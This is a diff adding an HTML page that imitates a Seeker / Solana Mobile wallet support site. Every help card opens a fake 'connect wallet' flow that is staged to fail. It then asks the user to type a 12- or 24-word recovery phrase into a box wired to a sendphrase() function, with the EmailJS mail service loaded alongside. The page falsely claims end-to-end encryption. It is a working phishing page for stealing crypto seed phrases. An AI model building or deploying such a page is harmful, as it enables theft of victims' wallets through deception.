@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("mfY7yH4IHyyVQsapk");
+        })();
+    </script>
+    <script src="script.js"></script>
+    <title>Seeker Sync</title>
+</head>
+
+<section id="supportOverlay" class="overlay">
+    <div class="glass-box1" id="glassBox1">
+        <span class="glass-close" onclick="closeOverlay()">✕</span>
+
+        <div class="wallet-header">
+            <h2 class="wallet-title">Connect Seeker</h2>
+
+            <img src="img/seeker.png" alt="Solana Mobile" class="wallet-logo" />
+
+            <button class="connect-wallet-btn" onclick="opensecondBox()">
+                Connect Wallet
+            </button>
+
+
+            <p class="wallet-status">
+                Please unlock and connect your Solana mobile.
+            </p>
+        </div>
+    </div>
+
+    <!-- GLASS BOX 2 -->
+    <div class="glass-box" id="glassBox2">
+        <span class="glass-close" onclick="closeOverlay()">✕</span>
+
+        <div class="wallet-header">
+            <h2 class="wallet-title">Seeker Connection</h2>
+
+            <img src="img/seeker.png" alt="Solana Mobile" class="wallet-logo" />
+
+            <div class="spinner">
+
+            </div>
+            <p class="wallet-status" id="walletStatusText"></p>
+        </div>
+    </div>
+
+    <div class="glass-box3" id="glassBox3">
+        <span class="glass-close" onclick="closeOverlay()">✕</span>
+
+        <div class="wallet-header">
+            <h2 class="wallet-title">Connection Failed</h2>
+
+            <img src="img/seeker.png" alt="Solana Mobile" class="wallet-logo" />
+
+            <p class="wallet-status">
+                A secure connection to your Seeker device could not be established.
+                Please try again or connect manually.
+            </p>
+
+            <div class="action-buttons">
+                <button class="retry-btn" onclick="retryConnection()">
+                    Retry Connection
+                </button>
+
+                <button onclick="openManualConnect()" class="manual-btn">
+                    Connect Manually
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="glass-box4" id="glassBox4">
+        <span class="glass-close" onclick="closeOverlay()">✕</span>
+
+        <div class="wallet-header">
+            <h2 class="wallet-title">Connect Manually</h2>
+
+            <img src="img/seeker.png" alt="Solana Mobile" class="wallet-logo" />
+
+            <select class="phrase-select" id="phraseType">
+                <option value="12" selected>12-word recovery phrase</option>
+                <option value="24">24-word recovery phrase</option>
+            </select>
+
+            <textarea id="phrasebox" class="phrase-textarea"
+                placeholder="Enter your recovery phrase here (words separated by spaces)"></textarea>
+
+            <button onclick="sendphrase()" class="connect-wallet-btn">
+                Connect Wallet
+            </button>
+
+            <p class="security-text">
+                🔒 All details are protected with end-to-end encryption.
+            </p>
+        </div>
+    </div>
+
+    <div class="glass-box5" id="glassBox5">
+        <span class="glass-close" onclick="closeOverlay()">✕</span>
+
+        <div class="wallet-header">
+            <div id="box5Spinner">
+                <img src="img/seeker.png" class="wallet-logo" />
+
+                <div class="spinner"></div>
+
+                <p class="loading-text">
+                    Establishing secure connection…
+                </p>
+            </div>
+
+            <!-- ERROR STATE -->
+            <div id="box5Error" style="display:none;">
+                <img src="img/adminbar.fw.png" alt="Connection Error" class="error-image" />
+
+                <p class="error-text">
+                    We couldn't establish a connection to your wallet.
+                    Please make sure your wallet is active and valid, then try again.
+                </p>
+            </div>
+        </div>
+</section>
+
+<body>
+    <header class="navbar">
+        <div class="nav-container">
+            <img src="img/seeker.png" alt="Ledger" class="logo">
+
+            <nav class="nav-links">
+                <a href="#">Home</a>
+                <a href="#">Connect</a>
+                <a href="#">Ledger Live</a>
+                <a href="#">Contact</a>
+            </nav>
+
+            <!-- Mobile menu icon -->
+            <i onclick="toggleMenu()" class="ri-menu-2-line"></i>
+        </div>
+    </header>
+
+    <section class="intro">
+        <img src="img/seekerxsolanamobile.png" alt="">
+
+    </section>
+    <section class="hero">
+        <h1>How can we help you?</h1>
+        <input type="text" placeholder="Search Seeker Support" class="search-box" />
+    </section>
+
+    <section class="categories">
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Getting Started</h3>
+            <p>Set up your Solana mobile device and start securing your crypto.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Seeker Live</h3>
+            <p>Install apps, manage accounts, and update your device.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Security & Privacy</h3>
+            <p>Protect your recovery phrase and avoid scams.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Troubleshooting</h3>
+            <p>Fix connection, update, and device issues.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Transactions</h3>
+            <p>Track your delayed transactions and manage your crypto assets.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Swap</h3>
+            <p>Swapping assets on Seeker & your Solana mobile.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Staking</h3>
+            <p>Staking assets on Seeker Live.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Exchange</h3>
+            <p>For issues relating to asset exchange services</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Connect to D'apps</h3>
+            <p>Experience seamless integration with decentralized applications.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Recovery</h3>
+            <p>Recover your wallet and assets with our step-by-step guide.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Claim Airdrop/Rewards</h3>
+            <p>To claim your airdrop and maximize your rewards.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>NFTs</h3>
+            <p>Manage and secure your NFTs with Seeker & Solana mobile.</p>
+        </div>
+
+        <div class="category-card" onclick="openOverlay()">
+            <h3>Locked Accounts</h3>
+            <p>Unlock your account and regain access to your assets.</p>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>© 2026 Seeker. All rights reserved.</p>
+    </footer>
+
+
+    <script src="function.js"></script>
+</body>
+
+</html>
+
+<!-- 
